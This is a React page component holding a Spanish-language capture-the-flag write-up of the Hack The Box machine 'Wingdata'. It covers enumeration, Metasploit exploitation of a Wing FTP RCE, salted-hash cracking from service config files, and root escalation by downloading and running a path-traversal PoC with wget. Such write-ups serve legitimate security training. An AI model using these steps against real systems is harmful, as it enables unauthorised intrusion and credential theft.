import React from "react";
import { useImageLightbox } from "@/components/ImageLightbox";

export default function Wingdata() {
  const { LightboxImage, LightboxOverlay } = useImageLightbox();

  return (
    <>
      <LightboxOverlay />
      <article className="prose prose-invert">
      <br />
      <LightboxImage src="/images/Blog/Miniaturas/wingdata.png" alt="Wingdata machine thumbnail" className="mx-auto" />
      <br />
      <p><strong>Descripción:</strong> Wingdata es una máquina Linux de nivel fácil enfocada en una aplicación de transferencia de archivos. 
        El reto cubre enumeración web, explotación de una vulnerabilidad RCE en el servicio FTP/portal, post-explotación con shell remota y escalada de privilegios mediante 
        análisis de sudo y vulnerabilidad en un script interno de backup.</p>
      <br />


      <strong>Enumeración</strong>
      <p>Comenzamos con un escaneo inicial de puertos usando <code>nmap</code>:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p- -n -Pn --open -sS --min-rate 2000 {IP}`}</pre>
      <br />
      <p>Parámetros:</p>
      <ul>
        <li><code>-p-</code> escanea todos los puertos</li>
        <li><code>-n</code> evita resolución DNS</li>
        <li><code>-Pn</code> no realiza descubrimiento de hosts</li>
        <li><code>--open</code> muestra solo puertos abiertos</li>
        <li><code>-sS</code> SYN stealth scan</li>
        <li><code>--min-rate 2000</code> velocidad mínima de paquetes</li>
      </ul>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Enumeracion/enumeracion_1.png" alt="nmap first scan" className="mx-auto" />
      <br />

      <p>Se detectaron los puertos 22 y 80 abiertos. Vemos que en el puerto 80 nos está diciendo que no puede redireccionarse a http://wingdata.htb/, por lo que debemos 
        añadir esta entrada al /etc/hosts. Luego realizamos un escaneo más detallado:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p80 -sCV -n -Pn wingdata.htb`}</pre>
      <br />

      <p>Parámetros:</p>
      <ul>
        <li><code>-p22,80</code> escanea los puertos especificados</li>
        <li><code>-sCV</code> Realiza escaneo de versiones y scripts</li>
        </ul>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Enumeracion/enumeracion_2.png" alt="nmap second scan" className="mx-auto" />
      <br />

      <p>Vemos que sobre el puerto 80 está corriendo un servidor web por http y con Apache en versión 2.4.66.</p>
      <br />

      <p>Luego accedemos a http://wingdata.htb y vemos un sitio web que nos habla de una solución para compartir archivos, indagando en la página vemos una opción para 
        portal de cliente, al acceder a ella nos dice que no puede resolver ese nombre de dominio (ftp.wingdata.htb).</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Enumeracion/enumeracion_3.png" alt="whatweb scan" className="mx-auto" />
      <br />

      <p>Por lo que debemos añadir la entrada al /etc/hosts igual que hicimos anteriormente con wingdata.htb, una vez guardamos en /etc/hosts podemos acceder a la aplicación web,
        donde de primeras vemos la versión y tecnología que está utilizando.
      </p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Enumeracion/enumeracion_4.png" alt="web interface" className="mx-auto" />   
      <br />

      <p>Investigando en internet vemos que la versión 7.4.3 presenta una vulnerabilidad de RCE, para usuarios sin autenticar (CVE-2025-47812).</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Enumeracion/enumeracion_5.png" alt="api enumeration" className="mx-auto" />
      <br />

      <p>Seguimos investigando y vemos que Metasploit tiene un módulo para explotar esta vulnerabilidad.</p>
      <br />
      
      <strong>Explotación</strong>
      <p>Nos abrimos Metasploit y buscamos el módulo de explotación para la vulnerabilidad CVE-2025-47812.</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`msfconsole
msf> search 47812`}</pre>
      <br />

      <p>Ajustamos los parámetros del módulo RHOST y LHOST.</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`msf> set RHOSTS ftp.wingdata.htb
msf> set LHOST {Nuestra_IP}`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Explotacion/explotacion_2.png" alt="web interface" className="mx-auto" />
      <br />

      <p>Hacemos <strong>check</strong> para comprobar si el servidor es vulnerable y le damos <strong>run</strong>.</p>
      <br />

      <p>Metasploit nos va a dar una sesión meterpreter y nos lanzamos una <strong>shell</strong>.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Explotacion/explotacion_3.png" alt="web interface" className="mx-auto" />
      <br />

      <p>Y vemos que tenemos acceso a los archivos de configuración del servicio wingftp, por lo que nos tomamos un tiempo en revisarlos.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Explotacion/explotacion_4.png" alt="web interface" className="mx-auto" />
      <br />

      <p>Viendo algunos hashes de contraseñas interesantes. Sin embargo vamos a leer el /etc/passwd:</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Explotacion/explotacion_6.png" alt="user registration" className="mx-auto" />
      <br />

      <p>Obteniendo así los usuarios de la máquina: en este caso wingftp, wacky y root. Por lo que nuestro próximo objetivo es escalar a wacky para tener mayor acceso al servidor.</p>
      <br />

      <p>Seguimos revisando los archivos del servicio wingftp y vemos que en el directorio /opt/wftpserver/Data/1/users/ hay hashes de contraseñas. Para el acceso al servicio.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Explotacion/explotacion_7.png" alt="registration form" className="mx-auto" />
      <br />

      <p>Donde una de ellas es para el usuario wacky, que vamos a intentar crackear. Que sucede el servicio Wingftp por defecto al aplicarle el hash a las contraseñas como medida de 
        seguridad le aplica un salt (es como una etiqueta al final), para de cierta forma robustecer el hash. Investigando en la documentación oficial, el servicio  por defecto 
        nos indica 2 cosas que el hash es tipo SHA-256 y que el salt es WingFTP.
      </p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Explotacion/explotacion_8.png" alt="registration success" className="mx-auto" />
      <br />

      <p>Nos copiamos el hash del usuario wacky en local y le añadimos al final :WingFTP para luego intentar crackearlo con hashcat, utilizando el modo 1410 que es para hashes 
      SHA-256 con salt.</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`hashcat -m 1410 hash_wacky.txt /usr/share/SecLists/rockyou.txt`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Explotacion/explotacion_9.png" alt="registration success" className="mx-auto" />
      <br />

      <p>Donde vemos que podemos crackearlo, con suerte podremos reutilizar la contraseña del servicio FTP para acceder por SSH al sistema como dicho usuario.</p>
      <br />

      <strong>Escalada de Privilegios</strong>
      <p>Ahora procedemos con la escalada de privilegios. Accedemos por ssh:</p>
      <br />
      
      <pre className="rounded bg-muted p-4 overflow-auto">{`ssh wacky@<IP>`}</pre>
      <br />
      
      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Escalada/escalada_1.png" alt="api user invite" className="mx-auto" />
      <br />
      
      <p>Donde vemos nuestra primera flag.</p>
      <br />

      <p>Nuestro próximo objetivo es escalar a root, comprobamos si podemos ejecutar comandos con sudo:</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`sudo -l`}</pre>
      <br />
      
      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Escalada/escalada_2.png" alt="api user invite" className="mx-auto" />
      <br />
      
      <p>Y vemos que tenemos un script en /opt/backup_clients/restore_backup_clients.py</p>
      <br />

      <p>Revisamos el script e investigamos al respecto en internet:</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Escalada/escalada_3.png" alt="api user invite" className="mx-auto" />
      <br />

      <p>Vemos que este script presenta una vulnerabilidad (CVE-2025-4517) donde permite descomprimir archivos sin validar correctamente la entrada, permitiendo la descompresion
        de archivos fuera del directorio actual del propio comprimido sino en rutas del sistema (Path Traversal).</p>
      <br />

      <p>Buscamos en internet algún exploit al respecto como por ejemplo: <a href="https://github.com/AzureADTrent/CVE-2025-4517-POC" target="_blank" rel="noopener noreferrer"> 
       AzureADTrent/CVE-2025-4517-POC</a></p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Escalada/escalada_4.png" alt="api user invite" className="mx-auto" />
      <br />

      <p>Nos lo descargamos a nuestra máquina y luego lo pasamos al servidor mediante un servidor web simple con python:</p>
      <br />

      <p>En nuestra máquina:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`python3 -m http.server 8000`}</pre>
      <br />
    
      <p>En el servidor:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`wget http://<TU_IP>:8000/CVE-2025-4517-POC.py
chmod +x CVE-2025-4517-POC.py
python3 CVE-2025-4517-POC.py`}</pre>
      <br />
      
      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Escalada/escalada_5.png" alt="api user invite" className="mx-auto" />
      <br />

      <p>Somos root por lo que buscamos la segunda flag y lo tenemos hecho.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Wing_Data_HTB/Escalada/escalada_6.png" alt="api user invite" className="mx-auto" />
      <br />
      
      <strong>Conclusiones</strong>
      <p>Wingdata es un laboratorio que permite ejercitar investigación sobre versiones de nuestros servicios, así como la explotación de vulnerabilidades conocidas. 
        En la fase de escalada debido a una vulnerabilidad conocida igualmente nos permitió hacernos root en el servidor, por lo que debemos siempre mantener nuestros 
        sistemas actualizados y parcheados para evitar este tipo de vulnerabilidades que pueden ser explotadas por atacantes.
      </p>
    </article>
    </>
  );
}
